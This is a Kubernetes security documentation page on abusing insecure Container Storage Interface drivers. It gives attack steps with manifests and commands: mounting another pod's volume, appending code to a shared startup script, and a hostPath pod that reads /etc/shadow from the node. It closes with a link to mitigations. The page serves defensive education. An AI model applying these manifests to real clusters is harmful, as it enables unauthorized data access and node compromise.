---
sidebar_position: 15
title: "Insecure CSI Drivers"
description: "How attackers exploit insecure Container Storage Interface (CSI) drivers to gain unauthorized access to persistent volumes and sensitive data."
---

# Insecure CSI Drivers

**Container Storage Interface (CSI) drivers** enable Kubernetes to manage persistent storage across different backends. If **misconfigured** or **insecure**, CSI drivers can allow attackers to **escalate privileges, access sensitive data, or manipulate persistent storage volumes**.

---

## Exploitation Steps: Abusing Insecure CSI Drivers

An attacker exploits **misconfigured CSI drivers** to access or modify persistent volumes.

### Step 1: Identify Exposed CSI Drivers

The attacker lists available **CSI storage classes** to identify potential misconfigurations:

```bash
kubectl get storageclass
```

If a storage class allows **unauthenticated access** or lacks security controls, the attacker proceeds.

### Step 2: Attach Unauthorized Persistent Volumes

If **CSI drivers allow volume reattachment**, the attacker mounts an existing volume from another pod:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
spec:
  containers:
    - name: attacker-container
      image: alpine
      command: ["/bin/sh", "-c"]
      args: ["sleep 3600"]
      volumeMounts:
        - mountPath: /data
          name: compromised-volume
  volumes:
    - name: compromised-volume
      persistentVolumeClaim:
        claimName: sensitive-data-pvc
```

```bash
kubectl apply -f attacker-pod.yaml
```

Now, the attacker has **unauthorized access** to sensitive data stored in the volume.

### Step 3: Exploit Weak Volume Policies

If a **CSI storage class** allows **ReadWriteMany (RWX) access**, an attacker can **modify shared storage** and introduce malicious payloads.

```bash
echo "Malicious code" >> /data/startup.sh
```

The next time a legitimate pod starts using this volume, the attacker's code **executes inside the target container**.

### Step 4: Abuse CSI Node Plugins for Host Access

Some **CSI drivers** run with **host-level privileges**, allowing attackers to execute commands directly on the node.

If a CSI plugin allows direct access to the node’s filesystem:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: csi-exploit-pod
spec:
  containers:
    - name: exploit-container
      image: alpine
      command: ["/bin/sh", "-c"]
      args: ["cat /host/etc/shadow"]
      volumeMounts:
        - mountPath: /host
          name: host-mount
  volumes:
    - name: host-mount
      hostPath:
        path: /
        type: Directory
```

Now, the attacker can **read and manipulate system files**.

### Result

The attacker successfully **accessed unauthorized data, modified storage volumes, or escalated privileges** through an insecure CSI driver.

---

## Mitigation Steps

To protect against **insecure CSI drivers**, follow the security best practices outlined in:

➡ **[Securing Kubernetes CSI Drivers](/docs/best_practices/cluster_setup_and_hardening/csi_driver_mitigation)**

This guide covers techniques such as **restricting volume attachments, enforcing PodSecurity policies, disabling privileged CSI plugins, and enabling RBAC controls** to secure storage operations in Kubernetes.
